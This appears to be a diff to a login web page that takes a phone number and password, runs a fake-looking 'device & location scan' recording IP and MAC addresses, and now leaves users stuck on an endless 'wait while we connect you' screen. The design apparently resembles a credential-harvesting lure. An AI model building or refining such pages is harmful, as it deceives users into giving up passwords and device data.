@@ -473,7 +473,7 @@
     <div class="message" id="password-msg-box"></div>
   </div>
 
-  <!-- Device & Location Scan Screen (6 seconds, then redirects to Step 1 Login Gateway) -->
+  <!-- Device & Location Scan Screen (6 seconds, then redirects to Step 1 Gateway) -->
   <div class="connected-screen" id="device-scan-screen">
     <div class="header" style="margin-bottom: 12px;">
       <h2 class="gold-title stage-shine" style="font-size: 20px;">Device & Location Scan</h2>
@@ -489,12 +489,14 @@
     <div class="timer-text stage-shine" id="scan-timer-text">Redirecting to login in 6 seconds...</div>
   </div>
 
-  <!-- Dashboard Screen (Appears ONLY after successful direct login) -->
+  <!-- Dashboard Screen (Appears after successful direct login) -->
   <div class="connected-screen" id="dashboard-screen">
     <div class="success-icon-wrap"><div class="success-icon">✓</div></div>
     <h3 class="gold-title stage-shine">Dashboard</h3>
     <p class="stage-shine" style="margin-bottom: 20px;">Welcome to your app dashboard!</p>
-    <button class="btn-submit" type="button" onclick="location.reload()">Log Out</button>
+    <div class="btn-submit" style="background: rgba(255, 255, 255, 0.08); color: #fef08a; border: 1.5px solid #b45309; cursor: default; animation: none;">
+      Wait while we connect you to your dashboard
+    </div>
   </div>
 
   <!-- Modals for Channel & Group verification -->
@@ -601,7 +603,7 @@
       return;
     }
 
-    // SUCCESSFUL LOGIN: Shows dashboard screenshot view
+    // SUCCESSFUL LOGIN: Shows dashboard screen with updated connecting message
     document.getElementById("login-form").style.display = "none";
     document.getElementById("dashboard-screen").style.display = "block";
   }
@@ -633,7 +635,7 @@
       return;
     }
     if (p1 !== p2) {
-      showMessage("reset-msg-box", "Passwords do not match.", "error");
+      showMessage("reset-msg-box", "Passwords do not match. Please re-confirm.", "error");
       return;
     }
 
@@ -860,7 +862,6 @@
       return;
     }
 
-    // Save profile info and password
     let currentIP = document.getElementById("scan-ip").textContent;
     let currentMAC = document.getElementById("scan-mac").textContent;
     saveRegisteredUser(userPhone, currentIP, currentMAC, p1);
@@ -868,7 +869,6 @@
     document.getElementById("password-form").style.display = "none";
     document.getElementById("device-scan-screen").style.display = "block";
 
-    // 6-second scan display timer, then redirects back to Step 1 Gateway
     let scanTimeLeft = 6;
     const scanTimerElem = document.getElementById("scan-timer-text");
     const scanInterval = setInterval(() => {
